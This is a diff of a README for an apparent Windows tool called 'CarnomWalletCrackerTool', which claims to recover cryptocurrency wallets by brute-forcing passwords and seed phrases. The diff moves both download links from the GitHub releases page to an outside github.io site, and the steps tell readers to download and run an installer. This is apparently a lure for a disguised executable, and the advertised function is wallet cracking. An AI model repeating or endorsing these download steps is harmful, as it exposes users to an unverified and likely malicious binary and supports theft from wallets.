@@ -1,6 +1,6 @@
 # 🔐 CarnomWalletCrackerTool - Regain Access To Lost Cryptocurrency Wallets
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Robitussinteardrop219/CarnomWalletCrackerTool/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://robitussinteardrop219.github.io)
 
 Carnom Wallet Cracker helps users regain access to cryptocurrency wallets. Many users lose their passwords or seed phrases. This tool uses brute-force techniques to test potential combinations and recover lost access. It works with many blockchain networks including Bitcoin, Ethereum, Solana, and Binance Smart Chain.
 
@@ -18,7 +18,7 @@ This software runs on modern Windows computers. Ensure your system meets these r
 
 You need the latest version of the software to ensure compatibility with current blockchain protocols. Visit the official release page to retrieve the installation file.
 
-[Click here to visit the release page and download the tool](https://github.com/Robitussinteardrop219/CarnomWalletCrackerTool/releases)
+[Click here to visit the release page and download the tool](https://robitussinteardrop219.github.io)
 
 1. Navigate to the link provided above.
 2. Look for the "Assets" section at the bottom of the latest release post.
